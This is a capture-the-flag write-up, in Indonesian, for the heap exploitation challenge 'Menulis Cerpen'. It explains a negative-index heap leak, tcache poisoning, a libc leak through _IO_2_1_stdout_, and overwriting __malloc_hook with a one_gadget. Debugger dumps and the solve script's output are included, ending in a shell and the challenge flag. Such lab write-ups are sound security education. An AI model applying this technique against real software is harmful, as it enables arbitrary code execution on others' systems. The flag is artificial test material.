# Menulis Cerpen

```
$ file soal
soal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld.so, BuildID[sha1]=9809791f8456de9942ad0876fbc3cfc9a689242b, for GNU/Linux 3.2.0, with debug_info, not stripped
$ checksec soal
[*] '/media/sf_virtual/cscctf/Menulis_cerpen/soal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
# exploit
step pengerjaannya
1. leak heap base address
2. memasukan alamat ke penampung tcache bin untuk write kemanapun
3. mencari libc base address dengan leak _IO_2_1_stdout_
4. masukan one gadget ke __malloc_hook

## 1--
Pada function Tulis_Paragraf() ada code yang berguna untuk leak heap base address
```
...
printf("Tulis diKolom %i :\n", Index_Paragraf + 1);
if ( Panjang_Tulisan < 0 || Panjang_Tulisan > 200 )
{
  .
}else{
  ...
  Paragraf[Index_Paragraf++] = tulisan;
  ...
}
```

pada Paragraf[Index_Paragraf++] = tulisan; akan memasukan alamat tulisan yang sudah dimalloc ke Index_Paragraf, agar printf("Tulis diKolom %i :\n", Index_Paragraf + 1); bisa leak alamat dari heap base
```
0x404040 <Banyak_Paragraf>:	0x0000000000000000      
0x404048 <Index_Paragraf>: 	0x0000000000000000
0x404050:       			0x0000000000000000      
0x404058:					0x0000000000000000
0x404060 <Paragraf>:    	0x0000000000000000      
0x404068 <Paragraf+8>:  	0x0000000000000000
```

dari atas artinya penulis akan membuat Index_Paragraf menjadi -3 ((0x404048-0x404060)/8)

pada function Kirim_Cerpen() kita bisa membuat Index_Paragraf menjadi -3
```
...
Index_Paragraf -= Banyak_Paragraf;
...
```

## 2--
penulis memasukan tulisan address (isinya 0x404010) ke heap base address + 88
```
0x862000:       0x0000000000000000      0x0000000000000251
0x862010:       0x0000000000000000      0x0000000000000000
0x862020:       0x0000000000000000      0x0000000000000000
0x862030:       0x0000000000000000      0x0000000000000000
0x862040:       0x0000000000000000      0x0000000000000000
0x862050:       0x0000000000000000      0x0000000000862350 <- tulisan address
```
agar Tcachebins kedetect seperti ini
```
Tcachebins[idx=1, size=0x30] count=0  ←  Chunk(addr=0x862350, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x404010, size=0x0, flags=)
```
memasukan satu kali junk malloc, akan seperti ini
```
Tcachebins[idx=1, size=0x30] count=0  ←  Chunk(addr=0x404010, size=0x0, flags=)
```
## 3--
penulis bisa menggunakan langkah ke 2 untuk leak _IO_2_1_stdout_ dengan menggunakan 
function main() dibagian terakhir
```
...
printf("Selamat %sberhasil mengirimkan Cerpennya\n", nama);
...
```
tujuannya nama='a'*15
maka di 
```
0x404010:       0x6161616161616161      
0x404018:		0x6161616161616161
0x404020 <stdout@@GLIBC_2.2.5>: 0x00007f33e50c2760
```
## 4--
penulis akan menggunakan langkah 1 dan 2 untuk memasukan one gadget ke __malloc_hook

hasilnya
```
┌─[root@kali]─[/media/sf_virtual/cscctf/Menulis_cerpen]
└──╼ #python solve.py 
[+] Starting local process '/media/sf_virtual/cscctf/Menulis_cerpen/soal': pid 2145
Heap Base Address : 0x107a000
Write ke address : 0x107a058
 _IO_2_1_stdout_ Address : 0x7ff1c7912760
Libc base Address : 0x7ff1c772d000
__malloc_hook Address : 0x7ff1c772d000
One_Gadget Address : 0x7ff1c780f383
[*] Switching to interactive mode
 Panjang : Tulis diKolom 1633283 :
$ cat flag.txt
CSCCTF{Tc4ch3_1s_n0T_S3cUr3_Br0}
```